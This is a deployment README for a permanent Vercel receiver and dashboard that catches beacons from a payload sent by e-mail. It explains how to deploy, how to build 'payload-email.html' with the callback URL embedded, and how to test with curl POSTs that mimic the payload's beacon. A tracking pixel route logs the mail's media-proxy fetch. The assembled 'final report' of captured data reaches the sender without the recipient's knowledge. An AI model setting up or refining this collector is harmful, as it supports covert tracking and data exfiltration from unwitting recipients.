# 06 — Vercel monitor (fixed URL, no tunnel)

A permanent, always-on receiver + live dashboard. Because the URL never changes, **the e-mail you
send once keeps working forever** — no tunnel to start, no payload to regenerate, no URL to re-send.

```
index.html        the live dashboard (polls /api/data every 3 s)
api/r.js          beacon ingest — POST /r?part=… → 200 + 1×1 GIF
api/data.js       everything the dashboard needs, already reassembled
lib/store.js      the store: Vercel KV when enabled, in-memory otherwise
vercel.json       /r → /api/r, and /pixel/logo.png → /api/r?part=pixel
package.json      no dependencies
```

## Deploy

1. Put this folder's contents at the root of the Vercel project (dashboard → **Add New… → Project**,
   or drag the folder in, or `vercel --prod` from inside it).
2. **Enable KV** — dashboard → your project → **Storage → Create Database → KV**, then
   *Connect* it to the project. Vercel injects `KV_REST_API_URL` and `KV_REST_API_TOKEN`
   automatically and the functions pick them up; nothing else to configure.
   *Without KV the receiver still works, but beacons live in the function's memory and are lost on a
   cold start. The dashboard shows `storage: memory` when that is the case.*
3. Deploy. Your endpoint is then `https://<your-project>.vercel.app`.

## Check it before sending anything

```bash
# the dashboard's data endpoint
curl -s https://<your-project>.vercel.app/api/data | head -20

# a beacon exactly like the payload's
curl -s -X POST -H "Content-Type: text/plain" \
     --data '{"step":"start","ts":"probe"}' \
     -o /dev/null -w "%{http_code} %{content_type}\n" \
     "https://<your-project>.vercel.app/r?part=progress"
# -> 200 image/gif, and the beacon appears at /api/data
```

## Build the payload for this URL

```bash
python ../02-PAYLOAD/build_payload.py --cb https://<your-project>.vercel.app
```

That writes `payload-email.html` with the URL already inside it. Send it, then open
`https://<your-project>.vercel.app/` — the dashboard fills in on its own.

## Notes

- **No interstitial.** Vercel serves requests directly, so there is nothing between the payload and
  the receiver — unlike ngrok's free tier, whose warning page is why the local script's payload uses
  POSTs. The POST transport is kept here anyway: it is CORS-simple (`Content-Type: text/plain`, no
  preflight) and it is what has been verified end to end.
- **The image in the message** points at `/pixel/logo.png`, which `vercel.json` routes into the
  receiver too, so the media-proxy fetch shows up as a beacon as well.
- **Clearing between runs:** the dashboard's *Clear capture* button, or
  `curl "https://<your-project>.vercel.app/api/data?clear=1"`.
- **Limits:** Vercel's free tier is generous for this (a run is ~10 requests, the final report is
  ~50 KB). The store keeps the last 500 beacons.
- The dashboard assembles the report client-side from the same beacons the local collector uses, so
  the two views agree.
